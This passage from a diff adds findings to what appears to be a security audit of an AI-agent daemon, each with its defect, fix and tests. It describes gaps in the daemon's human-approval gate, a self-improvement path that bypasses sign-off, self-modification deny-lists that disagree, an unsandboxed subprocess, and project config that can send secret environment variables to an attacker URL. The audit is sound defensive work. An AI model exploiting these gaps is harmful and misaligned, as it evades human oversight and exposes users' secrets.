+`StateGraph(_GateState)...compile()` with **no** `checkpointer=`. LangGraph's
+`interrupt()`/`Command(resume=...)` mechanism requires a compiled-in
+checkpointer to persist the paused state between the initial `ainvoke()`
+(which returns early on the interrupt) and the later
+`ainvoke(Command(resume=...), config)` in `resume()` (:216) — without one, the
+second call has no checkpoint to resume from `thread_id` and instead re-runs
+`gate_node` from entry, hitting `interrupt()` again rather than consuming the
+human decision. Untested by the suite: both `test_human_gate.py` and
+`test_hitl_approval_wiring.py` exclusively **mock** `gate._graph`, never
+exercising the real compiled graph's interrupt/resume round-trip. Net effect:
+HITL approval via LangGraph may be non-functional end-to-end.
+
+**Fix:** compile the gate graph with a checkpointer (`MemorySaver` or a
+`SqliteSaver`); add a real (non-mocked) interrupt→resume round-trip test.
+
+**Note (safe, no urgent exposure):** `resume()` is only reachable via
+`POST /admin/review/approve/{thread_id}` (`routers/review.py:58`), which is
+PSK-gated and mutating (not in `_PUBLIC_PATHS`), and is not wrapped as an
+agent tool — an agent cannot forge a resume itself.
+
+**Tests:** a real (unmocked) `_build_gate_graph()` instance: `ainvoke()`
+returns on the interrupt; a subsequent `ainvoke(Command(resume=...), config)`
+with the same `thread_id` actually consumes the human decision and proceeds
+past `gate_node`, rather than re-hitting the interrupt.
+
+### H-LANGGRAPH-FACTORY-ROLE-TRAP (MED, latent) — `make_langgraph_tool_loop` has no required `role`, dispatch-gate skipped
+
+**Defect:** `agents/capabilities.py:198-219` `make_langgraph_tool_loop` has
+**no** `role` param, so `LangGraphAgentLoop.__init__` defaults `role=None` →
+`check_dispatch` is skipped (`langgraph_agent.py:105-106`). Dead code today —
+the factory's only caller is a test; production uses
+`event_loop/loop.py:2364`, which constructs `LangGraphAgentLoop` directly and
+passes `role="event_loop"`. But it's a latent trap: the moment anyone wires
+this factory into a real call site without threading a `role` through, the
+LangGraph path runs **ungated** (no dispatch/capability check at all). Mirrors
+the already-known `make_tool_loop`'s `role=None` trap.
+
+**Fix:** add a required `role` param to `make_langgraph_tool_loop` (mirror
+whatever fix lands for `make_tool_loop`'s `role=None` trap), threading it into
+the `LangGraphAgentLoop` construction.
+
+**Tests:** calling `make_langgraph_tool_loop` without a `role` refuses/raises
+(or the signature makes omission impossible — a type-level regression guard);
+with a `role` supplied, `check_dispatch` is exercised on tool calls.
+
+### H-PROJECT-OVERLAY-DANGEROUS-FIELDS (HIGH, systemic) — untrusted project config can override security-posture fields, project wins
+
+**Defect:** an untrusted TARGET repo's `.gludd/general-ludd.yml` is
+deep-merged over `UserConfig` with **project winning**
+(`_apply_project_overlay`, `daemon.py:182-208`), and several
+project-overridable fields change security posture rather than mere
+behavior — the same "untrusted-repo-controls-gludd" theme as the
+ANSIBLE_COLLECTION_TRUST finding. Confirmed dangerous overlay vectors:
+- `connectors` — a project can register a connector pointing `base_url` at an
+  attacker URL with `token_env=<any secret env var>`; the connector reads
+  `os.environ.get(token_env)` and sends it to that URL → arbitrary-env-var
+  **secret exfiltration**. HIGH.
+- `database.url` — project-controlled SQLite path → arbitrary-path file
+  write. HIGH.
+- `budget` — no ceiling clamp on the overlay → a project overlay raises or
+  removes the spend cap → unbounded spend. MED-HIGH.
+- `issues` — project can redirect the GitHub/issue-polling source → task-
+  origination hijack: the daemon polls an attacker-controlled source and
+  executes whatever tasks it injects. HIGH.
+- `self_improve` — `auto_queue: true` (`event_loop/loop.py:4147-4157` via
+  `SelfImproveGate`) sends self-authored fix-todos straight to
+  `QUEUED`/dispatch, **bypassing** the `APPROVAL_REQUIRED` human sign-off;
+  `allow_unverified_reload: true` (`loop.py:2803`) makes a code-hot-swap
+  health-check **fail open** when health state is unavailable. MODERATE.
+
+**Safe by omission (no fix needed now, but flag for future refactors):**
+`model_profiles`, `process_isolation`, `self_update.auto_apply_config`,
+`deletion_gate_threshold`, `agents`, `ornith_binary_path` are wired only to
+operator-only config sources today, not project-overlaid — "dead by
+omission" rather than actively guarded, so a future refactor that
+reconnects them to the project overlay would silently reintroduce this same
+class of risk. Worth a code comment at the overlay call site warning future
+editors not to widen the merge without re-checking this list.
+
+**Fix:** restrict the project overlay to an **allowlist** of behavioral/
+cosmetic fields; security-posture fields — `connectors`, `database`,
+budget-ceiling, `issues` sources, `self_improve` gates, auth — must be
+**operator-only**, never project-overridable (mirror the
+ANSIBLE_COLLECTION_TRUST trust-tier split: operator/user tier trusted,
+project tier untrusted).
+
+**Tests:** a project overlay setting `connectors`, `database.url`,
+budget-ceiling, `issues`, or `self_improve.auto_queue` is **ignored**
+(operator config wins / the overlay is rejected for that key); a genuinely
+behavioral/cosmetic field in the overlay still applies (regression guard
+that the allowlist isn't over-broad in the other direction).
+
+## Round-10 additions (2026-07-10 night-2)
+
+### H-MEMORY-CROSS-PROJECT-BLEED (MED-HIGH, CONFIRMED) — agent memory table has no project_id, cross-project leak+overwrite
+
+**Defect:** `MemoryRecordModel` (`db/models.py:731-757`) has **no** `project_id`
+column — only `agent_id` + `namespace` + `key`, unique on
+`(agent_id, key, namespace)`. The production caller
+`event_loop/loop.py:542` `_build_memory_section` sets
+`agent_id = todo.assigned_agent or todo.work_type` — generic role/work-type
+strings like `"bug_fix"`/`"backend"`/`"agent"`, not namespaced by project. The
+daemon manages multiple projects behind one shared `MemoryRecordModel` table
+plus one global `app.state._memory_repo` (`daemon.py:1613`). So two projects
+whose todos share a `work_type`/`assigned_agent` read and write the **same**
+memory row: Project A's agent notes leak into Project B's prompt
+(`_build_memory_section` injects `## Agent Memory` straight into prompt
+text), and either project silently overwrites the other via the upsert
+`MemoryRepository.set` `on_conflict_do_update` (`db/repository.py:2776-2841`).
+`routers/memory.py` (`POST`/`GET`/`DELETE /api/memory`) takes `agent_id` as a
+bare client string with no ownership/project check — PSK-gated but not
+tenant-scoped. By contrast `TaskEmbeddingModel` (`models.py:760-781`, also no
+`project_id`) is fine: it holds 10 hardcoded canonical task-type descriptions
+(system config, intentionally global). Same tenant-isolation theme as
+H-DB-TENANT-SCOPING / H-OBS-TENANT-LEAK (Round-3/Round-7 above).
+
+**Fix:** add `project_id` to `MemoryRecordModel`, include it in the unique
+constraint (`(project_id, agent_id, key, namespace)`), and thread it through
+`routers/memory.py` and `_build_memory_section` (`loop.py:542`).
+
+**Tests:** project A cannot read or overwrite project B's memory row even
+when both share the same `work_type`/`agent_id`; same-project read/write/
+upsert still works unchanged.
+
+### H-MCP-STOPALL-ORPHAN (MED, CONFIRMED) — one failing transport.stop() orphans every remaining MCP subprocess
+
+**Defect:** `mcp/client.py:108-111` `stop_all()` loops
+`await transport.stop()` with **no** per-transport exception isolation: if
+any one `stop()` raises, the loop aborts, the remaining transports'
+subprocesses are **orphaned**, and `self._transports.clear()` never runs.
+Concrete trigger: `MCPStdioClient.stop()` (`transport.py:471-476`) calls
+`self._process.terminate()` **unguarded** — only the later `kill()` branch
+catches `ProcessLookupError` (:482-484) — so a TOCTOU race (child exits
+between the returncode-is-`None` check and `terminate()`) raises
+`ProcessLookupError` uncaught, which propagates through `stop_all()` and
+skips every subsequent server's cleanup. `daemon.py:2103-2108` wraps
+`stop_all()` in try/except but only logs generically. No test covers
+multi-transport `stop_all()` with one throwing.
+
+**Fix:** wrap each `transport.stop()` call in try/except (log and continue)
+so one failure doesn't orphan the rest; guard the initial `terminate()`
+against `ProcessLookupError` the same way the `kill()` branch already does.
+
+**Tests:** `stop_all()` with one transport's `stop()` raising still stops
+the others and clears the map; a `terminate()`-time
+`ProcessLookupError` (simulated TOCTOU) is swallowed like the `kill()`
+branch's existing handling.
+
+### H-MCP-UVX-UNPINNED (MED, CONFIRMED) — uvx package specs are exempt from the version-pin requirement other launchers enforce
+
+**Defect:** `mcp/transport.py:147-231` `_validate_package_spec` requires a
+concrete `pkg@x.y.z` pin only for `_NPM_FAMILY_LAUNCHERS`
+(npx/npm/pnpm/yarn/bunx, :34); `uvx` is in `_REMOTE_FETCH_LAUNCHERS` (gets
+the shell-metachar check) but is **explicitly excluded** from the pin
+requirement (:36,142-144,180; tested at
+`test_mcp_transport_pins.py:183-189`). So a bare `uvx some-package` (no
+version pin) launches, fetching whatever is currently on PyPI — a
+supply-chain substitution vector for a custom (non-catalog) project MCP
+config. Mitigation: the curated `_KNOWN_SERVERS` catalog
+(`catalog.py:203-305`) has **zero** uvx entries (all npx, all pinned), so
+this is only reachable via a hand-authored config, not the shipped catalog.
+
+**Fix:** require a version pin for `uvx` too (either `uvx pkg@x.y.z` or a
+`uvx --from pkg==x.y.z` form), matching the npm-family requirement.
+
+**Tests:** an unpinned `uvx` spec is rejected; a pinned `uvx pkg@x.y.z` (or
+`--from pkg==x.y.z`) spec is still accepted (regression guard on the
+legitimate path).
+
+## Round-11 additions (2026-07-10 night-3)
+
+### H-DENYLIST-DRIFT (MEDIUM, CONFIRMED) — three independent self-mod protected-path deny-lists disagree
+
+**Defect:** three independently-maintained protected-path lists guard
+different entry points into the self-modification write path and do not
+agree with each other: `self_update/applier.py:41-79`
+(`PROTECTED_PATH_MARKERS` + `_SEGMENT_EXACT_MARKERS`), `security/
+capability_lattice.py:41-75` (`PROTECTED_FILE_STEMS`/
+`PROTECTED_FILE_SUBSTRINGS`/`PROTECTED_PATH_SEGMENTS` via `is_protected_path()`),
+and `self_update/apply.py:51-65` (`_HARD_DENY_SUBSTRINGS`/
+`_HARD_DENY_SEGMENTS`). Concretely: `applier.py`'s `.github`/`/workflows/`/
+`pyproject.toml`/`makefile`/`alembic`/`/migrations/`/`setup.cfg`/`tox.ini`/
+`.pre-commit`/`dockerfile` markers are entirely absent from
+`capability_lattice.py`'s list; `apply.py` denies only `.opencode`/`.claude`/
+`settings.json`/`settings.local.json` and carries none of the build/CI/
+migration markers the other two have. A path denied at one entry point into
+the self-mod surface is allowed at another, so the effective guarantee
+depends on which code path a given write happens to traverse rather than on
+a single source of truth. Same root theme as H-SELFMOD-DENYLIST above (all
+three lists also independently omit `AGENTS.md`/`CLAUDE.md`/`TASKS.md`).
+
+**Fix:** consolidate into one shared deny-list module (e.g.
+`security/protected_paths.py`) exporting the merged marker/stem/substring/
+segment sets, and have `applier.py`, `capability_lattice.py`, and `apply.py`
+all import from it rather than maintaining independent copies.
+
+**Tests:** a path denied via any one of the three lists today is denied via
+all three after consolidation (parametrized over the union of markers); no
+existing legitimate path becomes newly denied (regression guard against an
+over-broad merge).
+
+### H-TENANT-CLAIM-FALLBACK (MEDIUM, CONFIRMED) — unscoped cross-tenant `claim_runnable` fallback when no project is selected
+
+**Defect:** `event_loop/loop.py:1376-1380` `_phase_claim_runnable_todos`: when
+`self._tick_project_id` is `None` — which happens whenever a `ProjectManager`
+is configured but `select_project()` returns `None` because no project has
+`dispatch_mode == "active"` (`projects/manager.py:321-338`, e.g. all projects
+paused/inactive) — the phase calls `self._todo_repo.claim_runnable()` with
+**no** `project_id` argument. `TodoRepository.claim_runnable`
+(`db/repository.py:424-451`) only applies a `WHERE project_id == ...` filter
+when `project_id` is not `None` (:437-440); with no project selected, the
+query claims QUEUED todos across **every** tenant's queue, globally ordered
+by `priority.desc()` then `created_at`. Net effect: a moment where the
+scheduler intends "no project is runnable right now" silently degrades into
+"claim across all tenants," crossing exactly the isolation boundary
+`TodoRepository.scoped()` exists to enforce elsewhere.
+
+**Fix:** fail closed — when `project_id` is `None` specifically because no
+active project was selected (as distinct from single-project/no-
+`ProjectManager` deployments, which legitimately pass `project_id=None`
+throughout), skip claiming for that tick rather than falling through to the
+unscoped `claim_runnable()` call.
+
+**Tests:** with a `ProjectManager` configured and all projects
+paused/inactive (`select_project()` returns `None`), `_phase_claim_runnable_todos`
+claims nothing (assert `claim_runnable` is not called, or is called with a
+sentinel that can never match a real tenant) even when QUEUED todos exist for
+other tenants; the existing single-project / no-`ProjectManager` path
+(`project_id` legitimately `None` end-to-end) is unaffected.
+
+### H-ORNITH-SANDBOX-GAPS (MEDIUM, latent — off by default) — export arbitrary file-write + unsandboxed coding-agent subprocess
+
+**Status:** both defects are gated behind `ORNITH_ENABLED` (off by default)
+plus the daemon PSK, so neither is reachable in a default deployment;
+recorded as defense-in-depth for when the feature is turned on.
+
+**Defect (a) — arbitrary file-write via export `out_path`:** `routers/
+ornith.py:182-209` `api_export` accepts a caller-supplied `out_path: str |
+None` and forwards it unsanitized into `OrnithTrainingRepo.export_dataset`
+(`ornith/training_repo.py:199-226`), which does `out = Path(out_path)`;
+`out.parent.mkdir(parents=True, exist_ok=True)`; `out.open("w", ...)`
+(:224-226) with no allowlist/realpath/traversal check — a PSK holder can
+point `out_path` anywhere the daemon process can write. The identical
+unconfined pattern (`out_path` straight into `Path(...).open("w")`) recurs in
+`ornith/training_data.py:267-348`.
+
+**Defect (b) — coding-agent subprocess has no sandbox:** `ornith/
+mcp_server.py:150-155` runs `subprocess.run([self._binary_path, "--json",
+json.dumps(arguments)], capture_output=True, text=True,
+timeout=self._timeout_seconds)` — only a wall-clock timeout; no
+`apply_limits`/rlimits/network-namespace restriction, unlike the hardened
+`abtest/_child.py` sibling subprocess. This is the D-27 sandbox gap that
+`security/security_backlog.py`'s `_check_d27_sandbox_limits` landed-guard
+does **not** cover (it does not inspect the ornith binary invocation).
+
+**Fix:** confine `out_path` to a scratch-directory allowlist (realpath +
+`relative_to` containment, mirroring `self_update/
+applier.py::_resolve_confined`) in both `training_repo.py` and
+`training_data.py`; apply the project's existing `apply_limits`/sandboxed-
+subprocess helper (as used by `abtest/_child.py`) to the `ornith_binary`
+invocation in `mcp_server.py`, and extend `_check_d27_sandbox_limits` to
+assert the ornith call site is covered so this doesn't silently regress.
+
+**Tests:** an `out_path` escaping the scratch allowlist (absolute path
+outside it, or a `..` traversal) is refused rather than written; a
+legitimate in-allowlist `out_path` still exports; the ornith subprocess
+invocation is asserted to run under the same rlimit/sandbox wrapper as
+`abtest/_child.py` (regression guard); `_check_d27_sandbox_limits` fails if
+the ornith call site stops being sandboxed.
+
+### H-PRIORITY-UPPERBOUND (LOW, def-in-depth) — `priority` has no upper bound at the schema/repository layer
+
+**Defect:** `schemas/todo.py:180-185` `_priority_non_negative` only rejects
+`priority < 0`; there is no upper-bound validator. `claim_runnable`
+(`db/repository.py:446-448`) orders candidates by `priority.desc()` first, so
+an arbitrarily large priority value always wins the claim race. The public
+`POST /api/todos` route maps priority through a 4-value enum before it
+reaches the schema, so it is safe in practice today; but the self-improve
+pipeline's `_coerce_priority` helper (cited as `self_improve.py:76-81` by the
+originating audit; not independently re-confirmed at that exact path in this
+pass) passes raw model-authored integers through to the same field with no
+clamp, and any future caller that reaches the schema directly with an
+untrusted integer inherits the same gap.
+
+**Fix:** add an upper-bound validator alongside `_priority_non_negative` in
+`schemas/todo.py` (e.g. clamp/reject above a fixed ceiling such as 100), and
+clamp in `_coerce_priority` as well so the defense-in-depth exists at both
+the production source and the schema boundary.
+
+**Tests:** a priority above the chosen ceiling is rejected/clamped at the
+schema layer; the existing enum-mapped public route is unaffected
+(regression guard); `_coerce_priority` clamps an out-of-range raw int rather
+than passing it through unchanged.
